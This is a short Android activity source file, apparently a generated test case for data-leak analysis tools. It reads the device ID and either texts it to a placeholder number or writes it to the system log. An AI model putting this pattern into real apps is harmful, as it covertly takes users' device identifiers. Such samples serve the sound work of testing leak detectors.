package com.generated.app;

import android.app.Activity;
import android.os.Bundle;
import android.content.Context;
import android.telephony.TelephonyManager;
import android.telephony.SmsManager;
import android.util.Log;

public class MainActivity extends Activity {
  private Context context = this;

  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity);
    String sensitiveData = "clear";
    TelephonyManager tm0 = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
    sensitiveData = tm0.getDeviceId(); // statementId: 0
    if (Math.random() > 0.5) {
      SmsManager sm1 = SmsManager.getDefault();
      sm1.sendTextMessage("+49123", null, sensitiveData, null, null); // statementId: 2

    } else {
      Log.i("INFO", sensitiveData); // statementId: 3

    }
  }

}